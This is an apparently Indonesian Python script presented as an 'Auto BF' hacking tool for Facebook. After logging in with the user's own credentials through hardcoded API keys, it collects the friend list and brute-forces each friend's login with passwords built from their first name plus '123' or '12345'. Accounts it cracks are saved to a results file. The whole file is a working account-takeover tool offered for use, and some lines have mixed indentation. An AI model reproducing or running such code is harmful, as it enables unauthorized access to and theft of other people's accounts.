# -*- coding: utf-8 -*-
import requests, json, sys, os, hashlib, getpass
from multiprocessing.pool import ThreadPool
os.system("clear")
try:
	os.mkdir("hasil")
except OSError:
	pass
# Buat ambil token itu punya Osif/Val hehe pinjem:'v
#Apaan ya? :'v
r = "\033[91m"
y = "\033[93m"
g = "\033[92m"
b = "\033[94m"
h = "\033[96m"
pm = "   ═════════════════════════════════════════════════"
target = []
toke = []
fin = []
live = []
die = []
crsh = []
Banner =(
r+""" 
   ╔═╗┬ ┬┌┬┐┌─┐  ╔╗ ┌─┐
   ╠═╣│ │ │ │ │  ╠╩╗├┤ 
   ╩ ╩└─┘ ┴ └─┘  ╚═╝└  by R4D3N G0Z4LL
   Nb : Akun Lu Harus Kebal""")
def login():
	try:
		print(y+pm)
		print(Banner)
                os.system("xdg-open https://www.youtube.com/channel/UCWmEKrHApBh-p8qWLFXX5pg")
		print(y+pm)
		id = raw_input(g+"   [+] Username : ")
                os.system("xdg-open https://youtu.be/2qH4IumteZA")
		pwd = getpass.getpass(g+"   [+] Password : ")
		N = '\033[0m'
		G = '\033[1;32m'
		API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
		x = hashlib.new('md5')
		x.update(sig)
		data.update({'sig':x.hexdigest()})
		masuk=requests.get('https://api.facebook.com/restserver.php',params=data).json()
		try:
			token=masuk["access_token"]
		except:
			print(r+"   [!] Gagal Masuk ! Checkpoint / Ada Kesalahan [!]")
			exit(y+pm)
		print(g+"   [+] Berhasil Masuk [+]")
		print(g+"   [+] Semoga Beruntung :) [+]")
                os.system("xdg-open https://youtu.be/2qH4IumteZA")
		toke.append(token)
		print(y+pm)
		for id in requests.get("https://graph.facebook.com/me/friends?access_token="+token).json()["data"]:
			target.append(id["id"])
	except KeyboardInterrupt:
		print(y+pm)
		sys.exit()
	except (requests.exceptions.ConnectionError ):
		print(y+pm)
		sys.exit()
def brute(tar):
	try:
		fn=requests.get("https://graph.facebook.com/"+tar+"?access_token=%s"%(toke[0])).json()["first_name"]
		fin.append(fn)
		for first in [fn+"123",fn+"12345"]:
			ro=requests.post("https://mbasic.facebook.com/login",data={'email':tar,'pass':first,'login':'submit'}).url
			if "save-device" in ro or "m_sess" in ro:
				live.append(tar)
				open("hasil/berhasil.txt","a"). write("%s|%s\n"%(tar,first))
				break
			elif "checkpoint" in ro:
				die.append(tar)
				open("hasil/gagal.txt","a").write("%s|%s\n"%(tar,first))
				break
			else:
				crsh.append(tar)
				break
		print(r+"\r[+] Gagal Di Hack = %s"%h+str(len(crsh)))+y+" | [+] Checkpoint = %s"%h+str(len(die))+g+" | [+] Berhasil Di Hack = %s"%h+str(len(live)),;sys.stdout.flush()
	except KeyboardInterrupt:
		print(y+pm)
		if len(live) > 0 or len(die) > 0:
			print(" ")
			print(y+pm)
			print(g+"   [+] Hasil Hack Akan Masuk Ke Dalam Folder [+]")
			exit(y+pm)
		else:
			print(" ")
			print(y+pm)
			print(r+"   [+] Tidak Ada Hasil ! Perbanyak Teman Anda [+]")
			exit(y+pm)
	except (requests.exceptions.ConnectionError ):
		exit(y+pm)
login()
tr=ThreadPool(int(input(g+"   [+] Thread (50)  : ")))
print(y+pm)
tr.map(brute,target)
#Lastt
if len(live) > 0 or len(die) > 0:
	print(" ")
	print(y+pm)
	print(g+"   [+] Hasil Hack Akan Masuk Ke Dalam Folder [+]")
	print(y+pm)
else:
	print(" ")
	print(y+pm)
	print(r+"   [+] Tidak Ada Hasil ! Perbanyak Teman Anda [+]")
	print(y+pm)
